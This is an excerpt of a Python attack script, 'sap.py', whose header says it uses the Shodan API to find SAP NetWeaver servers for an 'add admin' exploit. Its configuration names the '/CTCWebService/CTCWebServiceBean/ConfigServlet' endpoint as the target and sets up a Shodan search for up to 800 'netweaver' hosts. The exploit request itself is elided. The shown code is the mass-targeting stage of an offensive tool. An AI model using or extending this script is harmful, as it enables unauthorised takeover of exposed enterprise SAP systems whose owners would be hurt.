...
#
# sap.py
# Search SHODAN for SAP add admin exploiit
#
...
# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'netweaver'
FILE = "/CTCWebService/CTCWebServiceBean/ConfigServlet"
...
try:
        ...
        # Perform the search
		result = api.search(SEARCH_FOR,limit=800)
